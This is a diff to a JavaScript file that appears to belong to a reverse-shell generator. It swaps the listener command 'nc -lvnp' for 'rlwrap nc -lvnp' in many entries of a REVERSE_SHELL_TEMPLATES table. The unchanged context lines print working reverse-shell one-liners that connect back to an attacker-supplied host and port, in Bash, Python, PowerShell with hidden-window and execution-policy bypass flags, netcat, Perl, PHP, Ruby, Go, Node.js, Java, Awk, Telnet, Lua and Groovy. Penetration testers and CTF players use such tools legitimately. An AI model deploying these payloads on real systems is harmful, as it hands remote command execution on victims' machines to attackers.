@@ -3984,31 +3984,31 @@ const REVERSE_SHELL_TEMPLATES = {
   bash: {
     label: 'Bash',
     os: ['linux', 'mac'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'bash -c "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"'
   },
   bash_196: {
     label: 'Bash 196',
     os: ['linux', 'mac'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: '0<&196;exec 196<>/dev/tcp/{{LHOST}}/{{LPORT}}; {{SHELL}} <&196 >&196 2>&196'
   },
   bash_5: {
     label: 'Bash read line',
     os: ['linux', 'mac'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do $line 2>&5 >&5; done'
   },
   python: {
     label: 'Python',
     os: ['linux', 'mac', 'windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"{{SHELL}}\",\"-i\"])'"
   },
   python_short: {
     label: 'Python (short)',
     os: ['linux', 'mac', 'windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{{SHELL}}\")'"
   },
   python_ipv6: {
@@ -4020,85 +4020,85 @@ const REVERSE_SHELL_TEMPLATES = {
   powershell: {
     label: 'PowerShell',
     os: ['windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{{LHOST}}\',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
   },
   powershell_short: {
     label: 'PowerShell (short)',
     os: ['windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{{LHOST}}\',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
   },
   netcat: {
     label: 'Netcat (with -e)',
     os: ['linux', 'mac'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'nc {{LHOST}} {{LPORT}} -e {{SHELL}}'
   },
   netcat_openbsd: {
     label: 'Netcat OpenBSD',
     os: ['linux', 'mac'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{{SHELL}} -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f'
   },
   netcat_busybox: {
     label: 'BusyBox nc',
     os: ['linux'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'rm -f /tmp/p; mknod /tmp/p p && nc {{LHOST}} {{LPORT}} 0</tmp/p | {{SHELL}} 1>/tmp/p 2>&1'
   },
   perl: {
     label: 'Perl',
     os: ['linux', 'mac', 'windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'perl -e \'use Socket;$i="{{LHOST}}";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{{SHELL}} -i");};\'',
   },
   perl_no_sh: {
     label: 'Perl (no /bin/sh)',
     os: ['linux', 'mac', 'windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{{LHOST}}:{{LPORT}}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''
   },
   php: {
     label: 'PHP',
     os: ['linux', 'mac', 'windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'php -r \'$sock=fsockopen("{{LHOST}}",{{LPORT}});exec("{{SHELL}} -i <&3 >&3 2>&3");\''
   },
   php_cmd: {
     label: 'PHP cmd',
     os: ['linux', 'mac', 'windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'php -r \'$sock=fsockopen("{{LHOST}}",{{LPORT}});shell_exec("{{SHELL}} -i <&3 >&3 2>&3");\''
   },
   ruby: {
     label: 'Ruby',
     os: ['linux', 'mac', 'windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'ruby -rsocket -e\'f=TCPSocket.open("{{LHOST}}",{{LPORT}}).to_i;exec sprintf("{{SHELL}} -i <&%d >&%d 2>&%d",f,f,f)\''
   },
   ruby_no_sh: {
     label: 'Ruby (no /bin/sh)',
     os: ['linux', 'mac', 'windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{{LHOST}}","{{LPORT}}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''
   },
   golang: {
     label: 'Golang',
     os: ['linux', 'mac', 'windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{{LHOST}}:{{LPORT}}");cmd:=exec.Command("{{SHELL}}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'
   },
   nodejs: {
     label: 'Node.js',
     os: ['linux', 'mac', 'windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'node -e \'(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("{{SHELL}}", []);var client = new net.Socket();client.connect({{LPORT}}, "{{LHOST}}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();\''
   },
   java: {
     label: 'Java',
     os: ['linux', 'mac', 'windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'r = Runtime.getRuntime(); p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do $line 2>&5 >&5; done"});'
   },
   socat: {
@@ -4110,13 +4110,13 @@ const REVERSE_SHELL_TEMPLATES = {
   awk: {
     label: 'Awk',
     os: ['linux', 'mac'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'awk \'BEGIN {s = "/inet/tcp/0/{{LHOST}}/{{LPORT}}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'
   },
   telnet: {
     label: 'Telnet',
     os: ['linux', 'mac'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'TF=$(mktemp -u);mkfifo $TF && telnet {{LHOST}} {{LPORT}} 0<$TF | {{SHELL}} 1>$TF'
   },
   openssl: {
@@ -4128,13 +4128,13 @@ const REVERSE_SHELL_TEMPLATES = {
   lua: {
     label: 'Lua',
     os: ['linux', 'mac'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{{LHOST}}\',\'{{LPORT}}\');os.execute(\'{{SHELL}} -i <&3 >&3 2>&3\');"'
   },
   groovy: {
     label: 'Groovy',
     os: ['linux', 'mac', 'windows'],
-    attacker: 'nc -lvnp {{LPORT}}',
+    attacker: 'rlwrap nc -lvnp {{LPORT}}',
     victim: 'groovy -e \'String host="{{LHOST}}";int port={{LPORT}};String cmd="{{SHELL}}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\''
   }
 };
